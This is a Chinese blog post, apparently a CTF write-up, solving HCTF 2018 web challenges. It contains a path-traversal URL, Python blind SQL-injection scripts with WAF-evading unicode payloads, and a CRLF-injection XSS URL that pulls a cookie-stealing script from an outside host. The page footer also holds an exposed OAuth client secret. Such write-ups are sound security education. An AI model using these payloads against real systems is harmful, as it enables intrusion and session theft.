@@ -1,0 +1,812 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>2018HCTF之WEB详解(一)</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《2018HCTF之WEB详解(一)》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/12/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/11/12/2018 HCTF之WEB详解(一)/" itemprop="url">		
+			2018HCTF之WEB详解(一)		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/11/12/2018 HCTF之WEB详解(一)/" itemprop="url">
+	<time datetime="2018-11-12T15:34:06.747Z" itemprop="datePublished">
+  		2018-11-12
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://i.imgur.com/gHkLRNQ.jpg" alt=""></p>
+<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>属于签到题吧，毕竟做出来的那么多。。。。</p>
+<p>打开F12就会看到：<code>&lt;!--source.php--&gt;</code></p>
+<p>以及<code>hint</code>和<code>link</code>：<a href="http://warmup.2018.hctf.io/index.php?file=hint.php" target="_blank" rel="noopener">http://warmup.2018.hctf.io/index.php?file=hint.php</a>：</p>
+<pre><code>flag not here, and flag in ffffllllaaaagggg
+</code></pre><p>直接访问<a href="http://warmup.2018.hctf.io/source.php" target="_blank" rel="noopener">http://warmup.2018.hctf.io/source.php</a>就可以拿到源码</p>
+<pre><code>&lt;?php
+class emmm
+{
+public static function checkFile(&amp;$page)
+{
+$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+if (! isset($page) || !is_string($page)) {
+echo &quot;you can&#39;t see it&quot;;
+return false;
+}
+
+if (in_array($page, $whitelist)) {
+return true;
+}
+
+$_page = mb_substr(
+$page,
+0,
+mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+);
+if (in_array($_page, $whitelist)) {
+return true;
+}
+
+$_page = urldecode($page);
+$_page = mb_substr(
+$_page,
+0,
+mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+);
+if (in_array($_page, $whitelist)) {
+return true;
+}
+echo &quot;you can&#39;t see it&quot;;
+return false;
+}
+}
+
+if (! empty($_REQUEST[&#39;file&#39;])
+&amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+) {
+include $_REQUEST[&#39;file&#39;];
+exit;
+} else {
+echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+}  
+?&gt;
+</code></pre><p>首先学习一下：<a href="https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#2-1-%E6%B5%81%E7%A8%8B%E7%AE%80%E4%BB%8B" target="_blank" rel="noopener">Getshell技巧详解–phpMyAdmin利用之法</a></p>
+<p>发现上述源代码中只有：</p>
+<pre><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+</code></pre><p>才能够通过，但是发现截取会出现问题</p>
+<pre><code>$_page = mb_substr(
+$_page,
+0,
+mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+);
+</code></pre><p>随即构造：<code>http://warmup.2018.hctf.io/?file=hint.php?/../../../../../../../../ffffllllaaaagggg</code></p>
+<p>就会得到答案：<code>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</code></p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>在<a href="http://admin.2018.hctf.io/change" target="_blank" rel="noopener">http://admin.2018.hctf.io/change</a>的页面源码里发现提示</p>
+<pre><code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;
+</code></pre><p>得到源码可以找到有个进程每30秒重置一次数据库</p>
+<pre><code>#! /bin/bash 
+# while loops 
+n=1 
+
+while ((1))
+do
+  mysql -uroot -padsl1234 test &lt; user.sql
+  sleep 30m
+
+done
+</code></pre><p>我们可以看一下这个模板的规则的源码：</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response
+from flask_login import logout_user, LoginManager, current_user, login_user
+from app import app, db
+from config import Config
+from app.models import User
+from forms import RegisterForm, LoginForm, NewpasswordForm
+from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep
+from io import BytesIO
+from code import get_verify_code
+
+@app.route(&#39;/code&#39;)
+def get_code():
+image, code = get_verify_code()
+# 图片以二进制形式写入
+buf = BytesIO()
+image.save(buf, &#39;jpeg&#39;)
+buf_str = buf.getvalue()
+# 把buf_str作为response返回前端，并设置首部字段
+response = make_response(buf_str)
+response.headers[&#39;Content-Type&#39;] = &#39;image/gif&#39;
+# 将验证码字符串储存在session中
+session[&#39;image&#39;] = code
+return response
+
+@app.route(&#39;/&#39;)
+@app.route(&#39;/index&#39;)
+def index():
+return render_template(&#39;index.html&#39;, title = &#39;hctf&#39;)
+
+@app.route(&#39;/register&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def register():
+
+if current_user.is_authenticated:
+return redirect(url_for(&#39;index&#39;))
+
+form = RegisterForm()
+if request.method == &#39;POST&#39;:
+name = strlower(form.username.data)
+if session.get(&#39;image&#39;).lower() != form.verify_code.data.lower():
+flash(&#39;Wrong verify code.&#39;)
+return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form=form)
+if User.query.filter_by(username = name).first():
+flash(&#39;The username has been registered&#39;)
+return redirect(url_for(&#39;register&#39;))
+user = User(username=name)
+user.set_password(form.password.data)
+db.session.add(user)
+db.session.commit()
+flash(&#39;register successful&#39;)
+return redirect(url_for(&#39;login&#39;))
+return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form = form)
+
+@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def login():
+if current_user.is_authenticated:
+return redirect(url_for(&#39;index&#39;))
+
+form = LoginForm()
+if request.method == &#39;POST&#39;:
+name = strlower(form.username.data)
+session[&#39;name&#39;] = name
+user = User.query.filter_by(username=name).first()
+if user is None or not user.check_password(form.password.data):
+flash(&#39;Invalid username or password&#39;)
+return redirect(url_for(&#39;login&#39;))
+login_user(user, remember=form.remember_me.data)
+return redirect(url_for(&#39;index&#39;))
+return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)
+
+@app.route(&#39;/logout&#39;)
+def logout():
+logout_user()
+return redirect(&#39;/index&#39;)
+
+@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def change():
+if not current_user.is_authenticated:
+return redirect(url_for(&#39;login&#39;))
+form = NewpasswordForm()
+if request.method == &#39;POST&#39;:
+name = strlower(session[&#39;name&#39;])
+user = User.query.filter_by(username=name).first()
+user.set_password(form.newpassword.data)
+db.session.commit()
+flash(&#39;change successful&#39;)
+return redirect(url_for(&#39;index&#39;))
+return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)
+
+@app.route(&#39;/edit&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def edit():
+if request.method == &#39;POST&#39;:
+
+flash(&#39;post successful&#39;)
+return redirect(url_for(&#39;index&#39;))
+return render_template(&#39;edit.html&#39;, title = &#39;edit&#39;)
+
+@app.errorhandler(404)
+def page_not_found(error):
+title = unicode(error)
+message = error.description
+return render_template(&#39;errors.html&#39;, title=title, message=message)
+
+def strlower(username):
+username = nodeprep.prepare(username)
+return username
+</code></pre><p>看到strlower函数很奇怪</p>
+<pre><code>def strlower(username):
+    username = nodeprep.prepare(username)
+    return username
+</code></pre><p>网上还有一篇文章关于：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">Unicode安全</a></p>
+<p><img src="https://i.imgur.com/6JPltCO.png" alt=""></p>
+<p>简单的说明一下其过程思想：</p>
+<p>注册一个ᴬdmin账号</p>
+<p>登陆ᴬdmin，发现页面显示Admin</p>
+<p>修改密码，退出登录</p>
+<p>重新登陆Admin，看到flag</p>
+<p><img src="https://i.imgur.com/kZE5Cqp.png" alt=""></p>
+<h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>链接是：<a href="http://kzone.2018.hctf.io" target="_blank" rel="noopener">http://kzone.2018.hctf.io</a></p>
+<p>然而打开得到的却是QQ空间的链接，第一次遇到这种情况慢慢分析，这应该是一个qq空间钓鱼网站，使用御剑扫描一下就会得到</p>
+<p><img src="https://i.imgur.com/7yQ4U3B.png" alt=""></p>
+<p>逐个打开就会看到有信息的链接：<a href="http://kzone.2018.hctf.io/admin/login.php" target="_blank" rel="noopener">http://kzone.2018.hctf.io/admin/login.php</a></p>
+<p>以及一个可以下载源代码的链接：<a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a></p>
+<p>对这两个登陆页面的源码2018.php和login.php进行审计。 都包含了./include/common.php这个文件</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+header(&#39;Content-Type: text/html; charset=UTF-8&#39;);
+define(&#39;IN_CRONLITE&#39;, true);
+define(&#39;ROOT&#39;, dirname(__FILE__).&#39;/&#39;);
+define(&#39;LOGIN_KEY&#39;, &#39;abchdbb768526&#39;);
+date_default_timezone_set(&quot;PRC&quot;);
+$date = date(&quot;Y-m-d H:i:s&quot;);
+session_start();
+
+include ROOT.&#39;../config.php&#39;;
+
+if(!isset($port))$port=&#39;3306&#39;;
+include_once(ROOT.&quot;db.class.php&quot;);
+$DB=new DB($host,$user,$pwd,$dbname,$port);
+
+$password_hash=&#39;!@#%!s!&#39;;
+require_once &quot;safe.php&quot;;
+require_once ROOT.&quot;function.php&quot;;
+require_once ROOT.&quot;member.php&quot;;
+require_once ROOT.&quot;os.php&quot;;
+require_once ROOT.&quot;kill.intercept.php&quot;;
+?&gt;
+</code></pre><p>里面的safe.php会对请求的get，post，cookie进行过滤。</p>
+<pre><code>&lt;?php
+function waf($string)
+{
+$blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
+return preg_replace_callback($blacklist, function ($match) {
+return &#39;@&#39; . $match[0] . &#39;@&#39;;
+}, $string);
+}
+</code></pre><p>并且<code>username</code>和<code>password</code>都经过了<code>addslashes</code>函数转义，不存在宽字节注入，无法逃逸掉单引号。 提示<code>member.php</code>中<code>json</code>反序列化存在注入点</p>
+<pre><code>&lt;?php
+...
+if (isset($_COOKIE[&quot;islogin&quot;])) {
+if ($_COOKIE[&quot;login_data&quot;]) {
+$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+$admin_user = $login_data[&#39;admin_user&#39;];
+$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
+if ($udata[&#39;username&#39;] == &#39;&#39;) {
+setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
+setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
+}
+$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+if ($admin_pass == $login_data[&#39;admin_pass&#39;]) {
+$islogin = 1;
+} else {
+setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
+setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
+}
+}
+}
+?&gt;
+</code></pre><p>但是进入<code>member.php</code>的前提是<code>IN_CRONLITE=1</code>，所以要通过<code>common.php</code>进入<code>member.php</code>，</p>
+<p>但是<code>common.php</code>里面把<code>get</code>,<code>post</code>,<code>cookie</code>的内容给waf了。 但是我发现这里存在弱类型比较</p>
+<pre><code>$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+if ($admin_pass == $login_data[&#39;admin_pass&#39;]) {
+$islogin = 1;
+}
+</code></pre><p><code>password</code>是从<code>$udata</code>中获取的，不需要已知。尝试构造<code>login_data={“admin_user”:”admin”,”admin_pass”:1}</code>，</p>
+<p>对1所在的位置进行爆破，当<code>admin_pass=65</code>时，可以绕过，但是并不能登陆进去，可能是没有写入<code>cookie</code>，因此放弃了这个思路。</p>
+<p><img src="https://i.imgur.com/RO2lVd2.png" alt=""></p>
+<p>所以只能从绕<code>waf</code>入手了，大师傅提示<code>jsondecode</code>会解编码 </p>
+<p>参考：<a href="http://blog.sina.com.cn/s/blog_1574497330102wruv.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_1574497330102wruv.html </a></p>
+<p>这里的<code>cookie</code>参数是先经过<code>waf</code>后被<code>json</code>解码的，因此可以用<code>js</code>编码绕过<code>waf</code>，对<code>cookie</code>中的<code>admin_user</code>进行注入发现可以注入。</p>
+<p><img src="https://i.imgur.com/cObCifX.png" alt=""></p>
+<p>这里踩了个坑，python3会对unicode编码自动解码，需要转义一下，python2不需要。</p>
+<pre><code># -*- coding: utf-8 -*-
+import requests
+import string
+
+
+url = &#39;http://kzone.2018.hctf.io/include/common.php&#39;
+str1 = string.ascii_letters+string.digits+&#39;{}!@#$*&amp;_,&#39;
+
+
+def check(payload):
+cookie={
+&#39;PHPSESSID&#39;:&#39;8ehnp28ccr4ueh3gnfc3uqtau1&#39;,
+&#39;islogin&#39;:&#39;1&#39;,
+&#39;login_data&#39;:payload
+}
+try:
+requests.get(url,cookies=cookie,timeout=3)
+return 0
+except:
+return 1
+
+result=&#39;&#39;
+for i in range(1,33):
+for j in str1:
+#payload=&#39;{&quot;admin_user&quot;:&quot;admin\&#39;and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\&#39;%s\&#39;,\\u0073leep(3),0)/**/and/**/\&#39;1&quot;,&quot;admin_pass&quot;:65}&#39;%(i,j)
+payload = &#39;{&quot;admin_user&quot;:&quot;admin\&#39;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&#39;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;}&#39;% (str(i),ord(j))  
+#print(&#39;[+]&#39;+payload)
+if check(payload): 
+result += j
+break
+print(result)
+</code></pre><p>或者使用代码：</p>
+<pre><code>import requests
+
+dic = list(&#39;1234567890abcdefghijklmnopqrstuvwxyz[]&lt;&gt;@!-~?=_()*{}#. /&#39;)
+ans = &#39;&#39;
+for pos in range(1,1000):
+flag = 1
+for c in dic:
+payload = &quot;admin&#39;and(strcmp(right((select/**/*/**/from/**/F1444g/**/limit/**/0,1),%d),&#39;%s&#39;))||&#39;&quot;%(pos,c+ans)
+cookies = {&#39;islogin&#39;:&#39;1&#39;,&#39;PHPSESSID&#39;:&#39;olvurpb8sqldthvnetdd0elf65&#39;,&#39;login_data&#39;:&#39;{&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65}&#39;%payload}
+resp = requests.get(&quot;http://kzone.2018.hctf.io/include/common.php&quot;,cookies=cookies)
+if &#39;Set-Cookie&#39; in resp.headers:
+ans = c+ans
+print(ord(c))
+flag=0
+break
+if flag:
+break
+print(&quot;--&quot;+ans+&quot;--&quot;)
+</code></pre><p><img src="https://i.imgur.com/Wnv7RED.png" alt=""></p>
+<h3 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h3><p>参考P牛写的:<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">Bottle HTTP 头注入漏洞探究</a></p>
+<p>首先在注册和登陆处发现CLRF 第一天的响应包</p>
+<p><img src="https://i.imgur.com/C5qB48D.png" alt=""></p>
+<p>第二天的响应包</p>
+<p><img src="https://i.imgur.com/WP1Z7M3.png" alt=""></p>
+<p>刚开始的时候，CSP是在响应包的上面的，需要想办法绕过<code>CSP</code>。最后大师傅告诉我那个<code>hint1</code>不是机器人访问的crontab，</p>
+<p>是<code>bottle</code>这个框架重启的<code>crontab</code>。<code>bottle</code>这个框架好像有一个特性，每次重启的时候可以<code>bypass</code>掉<code>CSP</code>。</p>
+<p>但是出题人好像第二天发现这个<code>bypass</code>思路自己都复现不了，所以就把CSP设置到响应包下面了。 接下来就简单了，</p>
+<p>只需要绕过302跳转就可以打到<code>cookie</code>。因为302的时候不会<code>xss</code>。利用&lt;80端口可以绕过302跳转。可以在浏览器手动试一下。 80端口的时候</p>
+<p><img src="https://i.imgur.com/55tuISn.png" alt=""></p>
+<p>22 端口的时候，这个时候手动访问可以看到打到了cookie。</p>
+<p><img src="https://i.imgur.com/zlE8gDV.png" alt=""></p>
+<p>所以拿着下面这个payload就可以打到cookie了。</p>
+<pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:20/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/myjs/cookie.js%3E%3C/script%3E
+</code></pre><p><img src="https://i.imgur.com/CawgpLG.png" alt=""></p>
+<p>改cookie登陆</p>
+<p><img src="https://i.imgur.com/LAAxsC7.png" alt=""></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不会的还是有很多呀，题目虽然很难但是可以学到很多知识，加油！！！！！</p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2018/11/15/分析“正式版”的Kraken Cryptor勒索软件/" title="记一份分析“正式版”的Kraken Cryptor勒索软件">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/11/12/2018 web安全测试秋季资格赛部分题目writeup/" title="2018web安全测试秋季资格赛部分题目Writeup">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Warmup"><span class="post-toc-text">Warmup</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#admin"><span class="post-toc-text">admin</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#kzone"><span class="post-toc-text">kzone</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bottle"><span class="post-toc-text">bottle</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#总结"><span class="post-toc-text">总结</span></a></li></ol></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
